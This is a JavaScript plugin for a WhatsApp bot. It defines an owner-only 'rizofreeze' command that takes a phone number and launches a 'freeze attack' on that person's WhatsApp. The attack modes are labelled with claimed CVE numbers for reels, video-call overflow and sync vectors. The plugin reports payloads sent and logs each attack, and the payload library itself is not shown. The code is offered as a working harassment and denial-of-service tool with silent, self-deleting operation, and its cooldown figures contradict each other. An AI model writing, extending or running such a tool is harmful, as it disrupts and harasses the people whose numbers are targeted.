// plugins/rizofreeze.js
const { cmd } = require('../arslan');
const { Rizofreeze, CONFIG } = require('../lib/rizofreeze');
const guard = require('../lib/rizofreeze_guard');

cmd({
    pattern: 'rizofreeze',
    alias: ['rz', 'freeze', 'rizofz', 'ultrafreeze'],
    desc: 'RIZOFREEZE — number-only freeze attack (2026 CVEs, owner only)',
    category: 'owner',
    react: '🥶',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only — RIZOFREEZE*');

        if (!args[0]) {
            return reply(
`📌 *Usage:* .rizofreeze <number> [mode]

📖 *Modes:*
• reels — CVE-2026-23866
• video — video call overflow
• sync  — CVE-2026-48063
• all   — all vectors (default)

📖 *Examples:*
.rizofreeze 923001234567
.rizofreeze 923001234567 all
.rizofreeze 923001234567 reels

🥶 Number-only attack
🔇 Silent + Ephemeral (30s)
🛡 Bot-safe: YES
⏳ 72h cooldown | 1/day`
            );
        }

        const num = String(args[0]).replace(/[^0-9]/g, '');
        if (!num || num.length < 10) {
            return reply('❌ *Invalid number!*\nFormat: 923xxxxxxxxx (no +, no spaces)');
        }

        const mode = (args[1] || 'all').toLowerCase();
        const targetJid = num + '@s.whatsapp.net';

        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const check = guard.checkTarget(num, botNum);
        if (!check.ok) {
            return reply(`${check.msg}\n\n🚫 Target: \`${num}\`\n📋 Reason: \`${check.reason}\``);
        }

        await reply(
`🥶 *RIZOFREEZE LOCKED*
🎯 Number : \`${num}\`
💥 Mode   : ${mode}
🧬 Vectors: ${mode === 'all' ? 'reels + video + sync' : mode}
🔇 Silent  : ON
⏱️ Auto-del: 30s
🛡 Bot-safe: active
⚡ Launching...`
        );

        let lastPct = 0;
        const result = await Rizofreeze(conn, num, mode, (sent, total, type) => {
            const pct = Math.floor((sent / total) * 100);
            if (pct >= lastPct + 20) {
                lastPct = pct;
                conn.sendMessage(from, {
                    text: `⏳ RIZOFREEZE ${pct}% — *${type}* (${sent}/${total})`
                }).catch(() => {});
            }
        });

        if (result.ok) {
            guard.recordAttack(num, 'success');
            await conn.sendMessage(from, { react: { text: '🥶', key: mek.key } });
            const stats = guard.getStats();
            return reply(
`✅ *RIZOFREEZE COMPLETE*
🎯 Number : \`${num}\`
📤 Sent   : \`${result.sent}\` payloads
❌ Errors : \`${result.errors || 0}\` (${result.errorRate})
🧬 Vectors: ${result.vectors?.join(' + ') || mode}
🕒 ${new Date().toLocaleString()}

📊 Today : ${stats.todayCount}/${stats.dailyLimit}
⏳ Next in 120 min`
            );
        } else {
            guard.recordAttack(num, 'failed:' + result.error);
            return reply(`⚠️ *Failed:* ${result.error || 'all vectors errored'}`);
        }

    } catch (err) {
        console.log('RIZOFREEZE ERROR:', err);
        return reply(`❌ *RIZOFREEZE ERROR*\n\n${err.message}`);
    }
});